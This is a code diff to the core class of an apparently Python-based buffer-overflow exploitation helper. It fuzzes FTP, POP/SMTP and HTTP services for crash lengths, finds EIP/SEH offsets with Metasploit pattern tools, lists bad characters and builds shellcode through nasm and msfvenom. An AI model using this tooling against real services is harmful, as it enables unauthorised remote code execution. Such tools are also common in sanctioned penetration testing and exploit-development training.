@@ -10,12 +10,13 @@ from protocols.ftp import Ftp
 from protocols.http import Http
 from protocols.popsmtp import PopSmtp
 
-import codecs
+from utils.hexutil import HexUtil
 
+import codecs
 
 class System:
 
-    bads_to_test = ["\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0b", "\x0c", "\x0e", "\x0f",
+    nonprint_chars = ["\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0b", "\x0c", "\x0e", "\x0f",
             "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c",
             "\x1d", "\x1e", "\x1f", "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27", "\x28", "\x29",
             "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", "\x37",
@@ -38,24 +39,44 @@ class System:
 
         adapter = None
 
-        if(config.mode == "file"):
+        if(config.mode.lower() == "file"):
             return False;
 
         while adapter == None:
-            if(config.mode == "ftp"):
+            if(config.mode.lower() == "ftp"):
                 adapter = Ftp(config)
 
-            if(config.mode == "popsmtp"):
+            if(config.mode.lower() == "popsmtp"):
                 adapter = PopSmtp(config)
 
-            if(config.mode == "http"):
+            if(config.mode.lower() == "http"):
                 adapter = Http(config)
 
             if adapter == None:
-                config.mode = System.input("[?] Enter protocol [ftp / popsmtp / http]:")
+                config.mode = System.input("[?] Enter protocol [FTP / POPSMTP / HTTP]:")
 
         return adapter
 
+    @staticmethod
+    def hex_decomposition(config):
+        destination = System.input("[?] Enter destination hex address : 0x")
+
+        destination_hex = int(destination, 16)
+        print(destination_hex)
+
+        print(hex(round(destination_hex / 2)))
+        print((round(0x80 * 2)))
+
+        # print(HexUtil.hex_string_format(destination))
+        # print(HexUtil.hex_string_to_hex_value(destination))
+        # print(HexUtil.hex_string_to_bin_string(destination))
+
+    @staticmethod
+    def junk_buffer(config):
+        if (config.fuzzer_buffer != ""):
+            return config.fuzzer_buffer
+        else:
+            return "A" * config.offset
 
     @staticmethod
     def generic_fuzzer(config):
@@ -72,11 +93,39 @@ class System:
         else:
             config.offset = 0
 
-        if (config.overflow == 0 and config.offset == 0):
-            config.overflow = fuzzer_func(config.remoteip, config.remoteport, config.field, 100, 100)
+        if (config.offset == 0 and config.overflow == 0):
 
-            print("!" * 100)
-            print("[*] Application crashed at %s bytes" % config.overflow)
+            start = 100
+            end = 1000
+            step = 100
+
+            while True:
+                _range = System.input("[?] Enter the range do you want to fuzz separated by commas. Enter for default [100,1000,100]: ")
+
+                try:
+                    if("," in _range):
+                        _range_arr = _range.split(",")
+
+                        start = start if (_range_arr[0] == None or not _range_arr[0].isnumeric()) else int(_range_arr[0])
+                        end = end if (_range_arr[1] == None or not _range_arr[1].isnumeric()) else int(_range_arr[1])
+                        step = step if (_range_arr[2] == None or not _range_arr[2].isnumeric()) else int(_range_arr[2])
+
+                except Exception:
+                    print("[!] Starting with default...")
+                    break
+
+                if (start > end or step > end) :
+                    continue
+                else:
+                    break
+
+            config.overflow = fuzzer_func(config.remoteip, config.remoteport, config.field, start, end, step)
+
+            # print("!" * 100)
+            # print("[*] Application crashed at %s bytes with payload : " % (config.overflow, payload))
+
+        # if (config.fuzzer_type.lower() != "printables"):
+        #     config.offset = len(config.fuzzer_buffer)
 
         if (config.offset == 0 and config.overflow > 0):
             print("[+] Generating pattern: msf-pattern_create -l %s" % config.overflow)
@@ -101,16 +150,18 @@ class System:
             print("[+] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
 
             print("[!] Hint: !mona findmsp")
-            eip_value = System.input("[?] Check the target debugger and enter EIP or NSEH Value :")
+            offset_addr = System.input("[?] Check the target debugger and enter EIP / NSEH Address : ")
 
-            _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(eip_value)])
+            _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(offset_addr)])
             _offset = _offset.decode('latin-1').split('offset ')
 
             config.offset = int(_offset[len(_offset) - 1].strip())
 
+            print("=" * 150)
             print("[*] Fuzzing got offset : " + str(config.offset));
+            print("=" * 150)
 
-            System.save_session(config)
+        System.save_session(config)
 
     @staticmethod
     def show_session(config):
@@ -286,7 +337,7 @@ class System:
     @staticmethod
     def load_session(config):
 
-        if True:
+        if (config.session_ignore == False):
             session_file_path = "sessions/" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".restore"
             # print("[!] Searching for " + session_file_path)
 
@@ -373,8 +424,8 @@ class System:
             stream = os.popen("nasm " + asmfile + " -o sessions/" + asmfile + ".o")
             payload = stream.read()
             print(payload)
-            print("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " - e generic / none - f python")
-            stream = os.popen("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " - e generic / none - f python");
+            print("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " -e generic/none -f python")
+            stream = os.popen("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " -e generic/none -f python");
             payload = stream.read()
             print(payload)
 
@@ -427,9 +478,12 @@ class System:
 
     @staticmethod
     def input(message):
+        try:
+            if (sys.version_info >= (3, 0)):
+                return input("\n" + message + " ")
+            else:
+                print("\n" + message + " ")
+                return raw_input()
+        except KeyboardInterrupt:
+            raise KeyboardInterrupt
 
-        if (sys.version_info >= (3, 0)):
-            return input(message + " ")
-        else:
-            print(message + " ")
-            return raw_input()
